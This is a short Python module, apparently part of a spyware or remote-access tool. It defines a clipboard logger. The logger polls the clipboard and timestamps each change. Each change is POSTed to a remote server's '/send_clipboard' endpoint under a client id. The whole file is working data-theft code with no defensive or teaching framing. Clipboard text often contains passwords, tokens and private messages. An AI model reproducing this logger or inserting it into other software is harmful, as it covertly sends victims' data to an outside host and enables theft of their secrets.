from requests import post

from pyperclip import paste
from datetime import datetime

previous_clipboard_content = ""

def logger(protocol, remote_server, clientId):
	global previous_clipboard_content
	clipboard_content = paste()
	if clipboard_content != previous_clipboard_content:
		previous_clipboard_content = clipboard_content
		now = datetime.now()
		formatted_date = now.strftime("%d.%m.%Y %H:%M:%S")
		post(f'{protocol}://{remote_server}/send_clipboard?id={clientId}',
			 json={"text": f"<br>{formatted_date}: {clipboard_content}"})